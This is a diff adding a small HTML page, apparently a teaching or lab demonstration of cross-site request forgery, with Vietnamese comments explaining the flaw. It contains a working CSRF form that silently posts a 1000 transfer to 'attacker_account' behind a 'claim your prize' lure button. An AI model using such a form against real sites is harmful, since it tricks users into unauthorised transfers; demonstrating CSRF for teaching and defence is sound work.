@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF Vulnerability</title>
+  <link rel="stylesheet" href="/css/styles.css">
+</head>
+<body>
+  <h1>CSRF Vulnerability</h1>
+  <p>This is a CSRF vulnerability page.</p>
+  
+  <!-- Lỗ hổng CSRF: Kẻ tấn công có thể lợi dụng quyền của người dùng để thực hiện các hành động không mong muốn -->
+  <form action="http://example.com/transfer" method="POST">
+    <input type="hidden" name="recipient" value="attacker_account">
+    <input type="hidden" name="amount" value="1000">
+    <!-- Mã HTML hoặc JavaScript có thể được chèn vào trang web này để thực hiện hành động không mong muốn -->
+    <input type="submit" value="Click here to claim your prize!">
+  </form>
+</body>
+</html>
